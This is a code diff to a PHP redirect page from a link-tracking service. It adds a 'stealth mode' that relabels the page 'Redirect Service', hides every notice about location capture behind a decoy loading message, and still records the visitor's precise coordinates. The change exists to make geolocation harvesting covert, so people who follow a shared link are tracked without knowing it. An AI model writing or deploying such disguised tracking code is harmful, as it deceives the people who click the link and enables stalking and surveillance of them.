@@ -25,7 +25,7 @@ $original_url = $link['original_url'];
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Precise Location Tracking</title>
+    <title><?= SHOW_LOCATION_MESSAGES ? 'Precise Location Tracking' : 'Redirect Service' ?></title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
@@ -52,43 +52,58 @@ $original_url = $link['original_url'];
         <div class="row justify-content-center">
             <div class="col-md-8">
                 <div class="card shadow">
-                    <div class="card-header bg-primary text-white text-center">
-                        <h4><i class="fa-solid fa-map-marker-alt"></i> Precise Location Tracking</h4>
-                    </div>
+                                         <div class="card-header bg-primary text-white text-center">
+                         <h4><i class="fa-solid fa-map-marker-alt"></i> <?= SHOW_LOCATION_MESSAGES ? 'Precise Location Tracking' : 'Redirect Service' ?></h4>
+                     </div>
                     <div class="card-body">
                         
-                        <!-- Location Status Display -->
-                        <div id="locationStatus" class="location-status status-loading">
-                            <div class="text-center">
-                                <div class="spinner-border text-warning" role="status">
-                                    <span class="visually-hidden">Loading...</span>
-                                </div>
-                                <h5 class="mt-3">Getting Your Precise Location...</h5>
-                                <p class="text-muted">Please allow location access when prompted by your browser.</p>
-                                <div class="mt-3">
-                                    <button id="skipLocationBtn" class="btn btn-outline-secondary btn-sm" onclick="skipLocation()">
-                                        <i class="fa-solid fa-forward"></i> Skip Location & Continue
-                                    </button>
-                                </div>
-                            </div>
-                        </div>
+                                                 <!-- Location Status Display -->
+                         <?php if (SHOW_LOCATION_MESSAGES): ?>
+                         <div id="locationStatus" class="location-status status-loading">
+                             <div class="text-center">
+                                 <div class="spinner-border text-warning" role="status">
+                                     <span class="visually-hidden">Loading...</span>
+                                 </div>
+                                 <h5 class="mt-3">Getting Your Precise Location...</h5>
+                                 <p class="text-muted">Please allow location access when prompted by your browser.</p>
+                                 <div class="mt-3">
+                                     <button id="skipLocationBtn" class="btn btn-outline-secondary btn-sm" onclick="skipLocation()">
+                                         <i class="fa-solid fa-forward"></i> Skip Location & Continue
+                                     </button>
+                                 </div>
+                             </div>
+                         </div>
+                         <?php else: ?>
+                         <!-- Stealth mode - no location messages -->
+                         <div id="locationStatus" class="location-status status-loading" style="display: none;">
+                             <div class="text-center">
+                                 <div class="spinner-border text-primary" role="status">
+                                     <span class="visually-hidden">Loading...</span>
+                                 </div>
+                                 <h5 class="mt-3">Loading...</h5>
+                                 <p class="text-muted">Please wait while we prepare your destination.</p>
+                             </div>
+                         </div>
+                         <?php endif; ?>
 
-                        <!-- Location Details (Hidden initially) -->
-                        <div id="locationDetails" style="display: none;">
-                            <h5><i class="fa-solid fa-location-dot text-success"></i> Location Captured!</h5>
-                            <div class="row">
-                                <div class="col-md-6">
-                                    <p><strong>Latitude:</strong> <span id="latitude"></span></p>
-                                    <p><strong>Longitude:</strong> <span id="longitude"></span></p>
-                                    <p><strong>Accuracy:</strong> <span id="accuracy"></span> meters</p>
-                                </div>
-                                <div class="col-md-6">
-                                    <p><strong>Street Address:</strong> <span id="address"></span></p>
-                                    <p><strong>City:</strong> <span id="city"></span></p>
-                                    <p><strong>Country:</strong> <span id="country"></span></p>
-                                </div>
-                            </div>
-                        </div>
+                                                 <!-- Location Details (Hidden initially) -->
+                         <?php if (SHOW_LOCATION_MESSAGES): ?>
+                         <div id="locationDetails" style="display: none;">
+                             <h5><i class="fa-solid fa-location-dot text-success"></i> Location Captured!</h5>
+                             <div class="row">
+                                 <div class="col-md-6">
+                                     <p><strong>Latitude:</strong> <span id="latitude"></span></p>
+                                     <p><strong>Longitude:</strong> <span id="longitude"></span></p>
+                                     <p><strong>Accuracy:</strong> <span id="accuracy"></span> meters</p>
+                                 </div>
+                                 <div class="col-md-6">
+                                     <p><strong>Street Address:</strong> <span id="address"></span></p>
+                                     <p><strong>City:</strong> <span id="city"></span></p>
+                                     <p><strong>Country:</strong> <span id="country"></span></p>
+                                 </div>
+                             </div>
+                         </div>
+                         <?php endif; ?>
 
                         <!-- Redirect Button -->
                         <div class="text-center redirect-button">
@@ -118,12 +133,17 @@ $original_url = $link['original_url'];
             console.log('Updating status:', message, type);
             const statusDiv = document.getElementById('locationStatus');
             if (statusDiv) {
+                <?php if (SHOW_LOCATION_MESSAGES): ?>
                 statusDiv.className = `location-status status-${type}`;
                 statusDiv.innerHTML = `
                     <div class="text-center">
                         <h5><i class="fa-solid fa-${type === 'success' ? 'check-circle text-success' : 'exclamation-triangle text-danger'}"></i> ${message}</h5>
                     </div>
                 `;
+                <?php else: ?>
+                // Stealth mode - don't show location messages
+                statusDiv.style.display = 'none';
+                <?php endif; ?>
             }
         }
 
@@ -285,6 +305,7 @@ $original_url = $link['original_url'];
             
             console.log(`Location: ${lat}, ${lng} (accuracy: ${accuracy}m)`);
             
+            <?php if (SHOW_LOCATION_MESSAGES): ?>
             // Update display elements
             const latElement = document.getElementById('latitude');
             const lngElement = document.getElementById('longitude');
@@ -331,6 +352,10 @@ $original_url = $link['original_url'];
                     const addrElement = document.getElementById('address');
                     if (addrElement) addrElement.textContent = 'Could not determine address';
                 });
+            <?php else: ?>
+            // Stealth mode - don't show location details to user
+            console.log('Location captured in stealth mode');
+            <?php endif; ?>
         }
     </script>
 </body>
